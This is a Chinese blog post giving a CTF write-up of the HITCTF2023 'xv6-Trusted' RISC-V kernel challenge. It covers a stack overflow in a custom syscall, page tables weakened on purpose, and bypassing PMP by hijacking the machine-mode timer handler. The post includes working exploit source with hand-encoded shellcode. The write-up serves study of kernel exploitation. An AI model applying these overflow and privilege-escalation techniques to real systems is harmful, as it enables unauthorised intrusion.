            <a href="/Tech/Pwn/2a2c8d32f543.html" class="post-title-link" itemprop="url">【Pwn#0x15】HITCTF2023 xv6-Trusted writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-29 01:58:33" itemprop="dateCreated datePublished" datetime="2023-11-29T01:58:33+08:00">2023-11-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:32:38" itemprop="dateModified" datetime="2024-01-11T16:32:38+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/2a2c8d32f543.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x15】HITCTF2023 xv6-Trusted writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/2a2c8d32f543.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/2a2c8d32f543.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>哈哈，第一次打内核题，虽然是xv6但还是感觉非常酷。比赛结束前才想到了真的可行的思路，赛后结合官方 writeup 调出来了。（本篇博客没有写调试的技巧，就只写了题目相关的一些思路。）</p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>本程序由教学操作系统 xv6 改编而来，是一道 RISC-V 内核漏洞利用题。<br>在 xv6 中，没有地址随机化机制。但有着页表权限保护，也就是 R&#x2F;W&#x2F;X 权限位；并且在 xv6 通过 ecall 进入 supervisor mode 时，会将页表切换到内核页表，从而屏蔽对于用户内存地址的访问。</p>
<p>题目的目标是读出位于内核的数据段中的 flag，出题人贴心地给出了一个 <code>backdoor</code> 函数来帮我们读出 flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:000000008000620C                 # public backdoor</span><br><span class="line">.text:000000008000620C backdoor:</span><br><span class="line">.text:000000008000620C</span><br><span class="line">.text:000000008000620C var_s0          =  0</span><br><span class="line">.text:000000008000620C var_s8          =  8</span><br><span class="line">.text:000000008000620C arg_0           =  10h</span><br><span class="line">.text:000000008000620C</span><br><span class="line">.text:000000008000620C                 addi            sp, sp, -10h</span><br><span class="line">.text:000000008000620E                 sd              ra, var_s8(sp)</span><br><span class="line">.text:0000000080006210                 sd              s0, var_s0(sp)</span><br><span class="line">.text:0000000080006212                 addi            s0, sp, arg_0</span><br><span class="line">.text:0000000080006214                 li              a0, 80008860h</span><br><span class="line">.text:0000000080006220                 lui             a1, %hi(10000000h)</span><br><span class="line">.text:0000000080006224                 li              a2, 0</span><br><span class="line">.text:0000000080006226                 li              a3, 20h # &#x27; &#x27;</span><br><span class="line">.text:000000008000622A</span><br><span class="line">.text:000000008000622A loop:                                   # CODE XREF: backdoor+2A↓j</span><br><span class="line">.text:000000008000622A                 lb              a4, 0(a0)</span><br><span class="line">.text:000000008000622E                 sb              a4, %lo(10000000h)(a1)</span><br><span class="line">.text:0000000080006232                 addi            a0, a0, 1</span><br><span class="line">.text:0000000080006234                 addi            a2, a2, 1</span><br><span class="line">.text:0000000080006236                 blt             a2, a3, loop</span><br><span class="line">.text:000000008000623A                 la              a0, aHeyHereIsYourF # &quot;Hey, here is your flag&quot;</span><br><span class="line">.text:0000000080006242                 call            panic</span><br><span class="line">.text:0000000080006242 # End of function backdoor</span><br></pre></td></tr></table></figure>

<p>但不幸的是，内核中为 flag 所处的内存提供了额外的 PMP（Physical Memory Protection）保护，这里只是简单介绍一下用途，具体细节可以去阅读 RISC-V 特权手册（<a target="_blank" rel="noopener" href="https://github.com/riscv/riscv-isa-manual">riscv&#x2F;riscv-isa-manual: RISC-V Instruction Set Manual</a>）的对应章节（位于 Machine-Level ISA, Version 1.12 中）。</p>
<p>在 RISC-V 中有三种权限等级：通常机器启动时处于 <strong>machine mode</strong>、内核运行在 <strong>supervisor mode</strong>、用户程序运行在 <strong>user mode</strong>。<br>PMP 是一种由 <strong>machine mode</strong> 进行设置和修改的保护，可以给某段内存设置可读、可写、可执行等权限，并对 <strong>supervisor mode</strong> 和 <strong>user mode</strong> 生效。</p>
<p>在 <code>start</code> 函数中，内核为 flag 所在内存添加了不可读、不可写、不可执行的权限保护：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000800000D8                 la              a5, flag # &quot;HITCTF2023&#123;true_flag_on_server&#125;&quot;</span><br><span class="line">.text:00000000800000E0                 srli            a5, a5, 2</span><br><span class="line">.text:00000000800000E2                 ori             a5, a5, 3</span><br><span class="line">.text:00000000800000E6                 csrw            pmpaddr0, a5</span><br><span class="line">.text:00000000800000EA                 csrw            pmpaddr1, a4</span><br><span class="line">.text:00000000800000EE                 li              a5, -1</span><br><span class="line">.text:00000000800000F0                 srli            a5, a5, 0Ah</span><br><span class="line">.text:00000000800000F2                 csrw            pmpaddr2, a5</span><br><span class="line">.text:00000000800000F6                 li              a5, 0F0018h</span><br><span class="line">.text:00000000800000FC                 csrw            pmpcfg0, a5</span><br></pre></td></tr></table></figure>

<p>因此，就算我们直接在内核中调用 backdoor 函数，也只能看到一个报错而不是 Flag。（做题的时候以为马上出 flag 了，然后就遇到了禁止访问的报错，一时很难绷住）<br>我们想要读出 flag，就一定需要处于 machine mode 中，或者在 machine mode 中将保护关闭，但可以通过搜索 <code>pmpaddr</code> 的方法发现程序本身并没有提供关闭保护的功能（</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>第一个比较明显的漏洞，就是新添加的系统调用 <code>sys_encrypt</code> 中存在的栈溢出漏洞，官方 wp 中提供的函数源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">uint64 <span class="title function_">sys_encrypt</span><span class="params">(<span class="type">void</span>)</span>&#123;  </span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">256</span>];  </span><br><span class="line">    <span class="type">char</span> key[<span class="number">256</span>];  </span><br><span class="line">    uint l = <span class="number">0</span>;  </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* src;  </span><br><span class="line">    uint srclen;  </span><br><span class="line">    <span class="type">char</span>* dst;  </span><br><span class="line">    uint dstlen;  </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* keyva;  </span><br><span class="line">    uint keylen;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();  </span><br><span class="line">    argaddr(<span class="number">0</span>, (uint64*)&amp;src);  </span><br><span class="line">    argint(<span class="number">1</span>, (<span class="type">int</span>*)&amp;srclen);  </span><br><span class="line">    argaddr(<span class="number">2</span>, (uint64*)&amp;dst);  </span><br><span class="line">    argint(<span class="number">3</span>, (<span class="type">int</span>*)&amp;dstlen);  </span><br><span class="line">    argaddr(<span class="number">4</span>, (uint64*)&amp;keyva);  </span><br><span class="line">    argint(<span class="number">5</span>, (<span class="type">int</span>*)&amp;keylen);  </span><br><span class="line">    keylen = keylen &lt; <span class="number">256</span>? keylen: <span class="number">256</span>;  </span><br><span class="line">    copyin(p-&gt;pagetable, key, (uint64)(keyva), keylen);  </span><br><span class="line">    <span class="keyword">while</span>(l &lt; srclen)&#123;  </span><br><span class="line">        uint len_in_round = <span class="number">0</span>;  </span><br><span class="line">        <span class="comment">// copy in src. stack overflow here  </span></span><br><span class="line">        <span class="keyword">while</span>(len_in_round &lt; <span class="number">256</span> &amp;&amp; len_in_round &lt; srclen)&#123;  </span><br><span class="line">            copyin(p-&gt;pagetable, buffer + len_in_round, (uint64)(src + len_in_round), keylen);  </span><br><span class="line">            len_in_round += keylen;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">for</span>(uint i = <span class="number">0</span>; i &lt; len_in_round; i++)&#123;  </span><br><span class="line">            buffer[i] ^= key[i % keylen];  </span><br><span class="line">        &#125;  </span><br><span class="line">        copyout(p-&gt;pagetable, (uint64)(dst + l), buffer, len_in_round);  </span><br><span class="line">        l += len_in_round;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然函数的第一个 <code>copyin</code> 处对大小作了检查与限制（0x100），但第二个循环 <code>copyin</code> 很容易就会导致溢出。只要合理构造参数，我们就可以通过 <code>bufff</code> 溢出到高位。</p>
<p>第二个漏洞是页表的权限保护不当问题，原版 xv6 是没有这个问题的，而作者为了让题目能打所以手动改出了一些漏洞。</p>
<p>首先是内核代码可写。映射内核页表的代码位于 <code>vm.c-kvmmake()</code> 中，本来是长这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">kvmmap(kpgtbl, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>经过魔改后变成了这样（C 以及对应汇编）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kvmmap(kpgtbl, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_W | PTE_X);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000800011FA                 la              s2, etext</span><br><span class="line">.text:0000000080001202                 li              a4, 1110b</span><br><span class="line">.text:0000000080001204                 la              a3, 8000h</span><br><span class="line">.text:000000008000120C                 li              a2, 1</span><br><span class="line">.text:000000008000120E                 slli            a2, a2, 1Fh</span><br><span class="line">.text:0000000080001210                 mv              a1, a2</span><br><span class="line">.text:0000000080001212                 mv              a0, s1</span><br><span class="line">.text:0000000080001214                 call            kvmmap</span><br></pre></td></tr></table></figure>

<p>其次是进程内核栈可执行，代码位于 <code>proc.c</code> 中，原来长这样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Allocate a page for each process&#x27;s kernel stack.</span></span><br><span class="line"><span class="comment">// Map it high in memory, followed by an invalid</span></span><br><span class="line"><span class="comment">// guard page.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">proc_mapstacks</span><span class="params">(<span class="type">pagetable_t</span> kpgtbl)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    <span class="type">char</span> *pa = kalloc();</span><br><span class="line">    <span class="keyword">if</span>(pa == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;kalloc&quot;</span>);</span><br><span class="line">    uint64 va = KSTACK((<span class="type">int</span>) (p - proc));</span><br><span class="line">    kvmmap(kpgtbl, va, (uint64)pa, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过魔改后变成了这样（伪代码以及汇编）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kvmmap(kpgtbl, va, (uint64)pa, PGSIZE, PTE_R | PTE_W | PTE_X);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000800018CA                 li              a4, 1110b</span><br><span class="line">.text:00000000800018CC                 lui             a3, 1</span><br><span class="line">.text:00000000800018CE                 sub             a1, s2, a1</span><br><span class="line">.text:00000000800018D2                 mv              a0, s3</span><br><span class="line">.text:00000000800018D4                 call            kvmmap</span><br></pre></td></tr></table></figure>

<p>因此，结合 xv6 没有随机化的特性，我们可以在栈上打 shellcode，且连 NOP Sled 都不用嘿嘿。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>最初的步骤：如何构造 <code>sys_encrypt</code> 参数、以及劫持返回地址、以及栈上的 shellcode 执行略去不表（算一下调一下就好 hhhh）。这里就假设我们已经可以任意执行代码了。</p>
<p>为了绕过 PMP 保护，我想到了几种思路：</p>
<h3 id="找到未被保护的Flag"><a href="#找到未被保护的Flag" class="headerlink" title="找到未被保护的Flag"></a>找到未被保护的Flag</h3><p>由于 Flag 是硬编码在 kernel 文件中的，因此我首先想到的办法是<strong>泄露服务器端的 kernel 文件</strong>。但是 xv6 在生成文件系统的时候，并不会将 kernel 放在里面。<br>我们使用 qemu 启动 xv6 时直接指定了编译好的 kernel，qemu 会把 kernel 直接加载到内存中。</p>
<p>所以在 xv6 系统内，内核只存在于内存中且独一无二，这种方法被证实是不行的（</p>
<h3 id="RESET"><a href="#RESET" class="headerlink" title="RESET"></a>RESET</h3><p>在阅读 RISC-V 手册时，我注意到在 machine mode 中有一个小章节介绍了 Reset 。此时我已经发现了内核代码是可修改的，因此我想到的办法就是将 <code>start</code> 函数中对 <code>flag</code> 施加保护的代码覆写为 <code>nop</code> ，然后进行重启，这样重启后的系统就不会再有对 <code>flag</code> 的保护。</p>
<p><strong>重启并不是 CPU 负责的事</strong>（CPU 负责的都是计算），准确来说并不是一个指令集所关心的事情。通常，重启是通过 CPU <strong>向主板设备发送信号</strong>来完成的。<br>在题目环境中，启动 <code>qemu</code> 时指定使用的主板是 <code>virt</code> ，一个只具有最基础功能的主板，其描述见 <a target="_blank" rel="noopener" href="https://www.qemu.org/docs/master/system/riscv/virt.html">‘virt’ Generic Virtual Platform (virt) — QEMU documentation</a>。</p>
<p>如何知道这个设备能否重启、如何重启呢？反正上面这个文档里我没找到（悲）。<br>我在 qemu 的源码中找到了该主板设备负责注册重启功能的函数：<a target="_blank" rel="noopener" href="https://github.com/qemu/qemu/blob/master/hw/riscv/virt.c#L904">qemu&#x2F;hw&#x2F;riscv&#x2F;virt.c at master · qemu&#x2F;qemu (github.com)</a>，具体来说是如下几行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qemu_fdt_setprop_cells(ms-&gt;fdt, name, <span class="string">&quot;reg&quot;</span>,</span><br><span class="line">    <span class="number">0x0</span>, memmap[VIRT_TEST].base, <span class="number">0x0</span>, memmap[VIRT_TEST].size);</span><br><span class="line">qemu_fdt_setprop_cell(ms-&gt;fdt, name, <span class="string">&quot;phandle&quot;</span>, test_phandle);</span><br><span class="line">test_phandle = qemu_fdt_get_phandle(ms-&gt;fdt, name);</span><br><span class="line">g_free(name);</span><br><span class="line"></span><br><span class="line">name = g_strdup_printf(<span class="string">&quot;/reboot&quot;</span>);</span><br><span class="line">qemu_fdt_add_subnode(ms-&gt;fdt, name);</span><br><span class="line">qemu_fdt_setprop_string(ms-&gt;fdt, name, <span class="string">&quot;compatible&quot;</span>, <span class="string">&quot;syscon-reboot&quot;</span>);</span><br><span class="line">qemu_fdt_setprop_cell(ms-&gt;fdt, name, <span class="string">&quot;regmap&quot;</span>, test_phandle);</span><br><span class="line">qemu_fdt_setprop_cell(ms-&gt;fdt, name, <span class="string">&quot;offset&quot;</span>, <span class="number">0x0</span>);</span><br><span class="line">qemu_fdt_setprop_cell(ms-&gt;fdt, name, <span class="string">&quot;value&quot;</span>, FINISHER_RESET);</span><br><span class="line">g_free(name);</span><br></pre></td></tr></table></figure>

<p>从这里的代码我们可以大致猜到，映射所采用的是 mmio 方法，地址 <code>VIRT_TEST</code> 偏移 0 处，如果写入 <code>FINISHER_RESET</code> 的话就可以进行重启。借助 Github 右栏的引用查找功能，不难找到 <code>VIRT_TEST</code> 的值为 <code>0x100000</code>，<code>FINISHER_RESET</code> 的值为 0x7777。</p>
<p>经过测试，确实可以通过这个方法来 reset 机器。但是我悲伤地发现在 reset 之后，我对内核代码做的修改也一起 reset 了。看来 qemu 每次 reset 都会重新加载一遍 kernel 文件啊。</p>
<h3 id="修改-timervec"><a href="#修改-timervec" class="headerlink" title="修改 timervec"></a>修改 timervec</h3><p>在测试完上面那种方法不可行后，我就想到了这个方法，但此时离结束比赛只剩下半小时，因此非常可惜没有做完。（后来看官方的 wp 又得知了一些 trick，说不定我自己调也还要调半天）</p>
<p>既然 PMP 只有 machine mode 可以操控或无视，那么我们的目标就是想方设法进入 machine mode。<br>正好，xv6 对于 timer interrupt 的处理是位于 machine mode 中的。具体来说，会在 <code>start</code> 函数中调用 <code>timerinit</code>，来将 <code>timervec</code> 函数注册到 mtvec 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// arrange to receive timer interrupts.</span></span><br><span class="line"><span class="comment">// they will arrive in machine mode at</span></span><br><span class="line"><span class="comment">// at timervec in kernelvec.S,</span></span><br><span class="line"><span class="comment">// which turns them into software interrupts for</span></span><br><span class="line"><span class="comment">// devintr() in trap.c.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">timerinit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the machine-mode trap handler.</span></span><br><span class="line">  w_mtvec((uint64)timervec);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// enable machine-mode interrupts.</span></span><br><span class="line">  w_mstatus(r_mstatus() | MSTATUS_MIE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// enable machine-mode timer interrupts.</span></span><br><span class="line">  w_mie(r_mie() | MIE_MTIE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，实际上内核在启动进入 supervisor mode 之后，唯一使用 machine mode 执行的代码就是这个 timervec 函数了，实现位于 <code>kernelvec.S</code> 中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.globl timervec</span><br><span class="line">.align 4</span><br><span class="line">timervec:</span><br><span class="line">        # start.c has set up the memory that mscratch points to:</span><br><span class="line">        # scratch[0,8,16] : register save area.</span><br><span class="line">        # scratch[24] : address of CLINT&#x27;s MTIMECMP register.</span><br><span class="line">        # scratch[32] : desired interval between interrupts.</span><br><span class="line">        </span><br><span class="line">        csrrw a0, mscratch, a0</span><br><span class="line">        sd a1, 0(a0)</span><br><span class="line">        sd a2, 8(a0)</span><br><span class="line">        sd a3, 16(a0)</span><br><span class="line"></span><br><span class="line">        # schedule the next timer interrupt</span><br><span class="line">        # by adding interval to mtimecmp.</span><br><span class="line">        ld a1, 24(a0) # CLINT_MTIMECMP(hart)</span><br><span class="line">        ld a2, 32(a0) # interval</span><br><span class="line">        ld a3, 0(a1)</span><br><span class="line">        add a3, a3, a2</span><br><span class="line">        sd a3, 0(a1)</span><br><span class="line"></span><br><span class="line">        # arrange for a supervisor software interrupt</span><br><span class="line">        # after this handler returns.</span><br><span class="line">        li a1, 2</span><br><span class="line">        csrw sip, a1</span><br><span class="line"></span><br><span class="line">        ld a3, 16(a0)</span><br><span class="line">        ld a2, 8(a0)</span><br><span class="line">        ld a1, 0(a0)</span><br><span class="line">        csrrw a0, mscratch, a0</span><br><span class="line"></span><br><span class="line">        mret</span><br></pre></td></tr></table></figure>

<p>这是一个会不定期被触发的、位于 machine mode 中的函数，这个函数的实现位于内核中，且是<strong>可以修改的</strong>。<br>所以我们劫持这个函数调用 backdoor，就可以让 backdoor 函数在 machine mode 被执行了，从而打印出 Flag。</p>
<p>（这里本来脑子没转过来，想的是让 timervec 把 PMP 给关了，然后我自己调用 backdoor，但这种方法增加了复杂度，不如直接调用 backdoor 简洁）</p>
<p>此外还有一个注意点，就是在进入 timervec 之后，需要使用 <code>csrw mie, x0</code> （machine-mode interrupt enable）来关闭 machine mode 的各种中断。否则，在读 flag 读一半触发这个中断就不好了。（看官网 wp 学到的）</p>
<p>我的 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  hijack timervec:</span></span><br><span class="line"><span class="comment"> *   30401073          	 csrr   mie,x0 (disable timer interrupt)</span></span><br><span class="line"><span class="comment"> *   00060067            jr     a2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">uint32 a1[<span class="number">0x140</span>/<span class="number">4</span>] = &#123;</span><br><span class="line">    <span class="number">0x00040637</span>,     <span class="comment">// li a2, 0x80006214</span></span><br><span class="line">    <span class="number">0x0036061b</span>,</span><br><span class="line">    <span class="number">0x00d61613</span>,</span><br><span class="line">    <span class="number">0x21460613</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x00040537</span>,     <span class="comment">// li a0, 0x80005BF0</span></span><br><span class="line">    <span class="number">0x0035051b</span>,</span><br><span class="line">    <span class="number">0x00d51513</span>,</span><br><span class="line">    <span class="number">0xbf050513</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x304015b7</span>,     <span class="comment">// li a1, 0x30401073</span></span><br><span class="line">    <span class="number">0x0735859b</span>,</span><br><span class="line">    <span class="number">0x00b53023</span>,     <span class="comment">// sd a1, (a0)</span></span><br><span class="line">    <span class="number">0x00450513</span>,     <span class="comment">// addi a0, a0, 4</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x000605b7</span>,     <span class="comment">// li a1, 0x00060067</span></span><br><span class="line">    <span class="number">0x0675859b</span>,</span><br><span class="line">    <span class="number">0x00b53023</span>,     <span class="comment">// sd a1, (a0)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x0000006f</span>,     <span class="comment">// infinte loop</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> a3[<span class="number">0x140</span>];</span><br><span class="line"><span class="type">char</span> a5[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)(&amp;a1[<span class="number">0x138</span>/<span class="number">4</span>]) = <span class="number">0x3fffff9e80</span>;  <span class="comment">// ra = 0x3fffff9e80 shellcode</span></span><br><span class="line">    encrypt((<span class="type">char</span>*)a1, <span class="number">0x100</span>, a3, <span class="number">0</span>, a5, <span class="number">0xa0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外还有一个坑，就是 backdoor 函数前 N 句汇编是一些栈相关操作，我们需要跳过这几句汇编。否则内核会卡住不动！太坑了！</p>
<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202311290204319.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Linux/def2b48d2855.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis's Homepage">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Linux/def2b48d2855.html" class="post-title-link" itemprop="url">【Linux#0x01】Linux权限模型</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-09 23:36:16" itemprop="dateCreated datePublished" datetime="2023-11-09T23:36:16+08:00">2023-11-09</time>
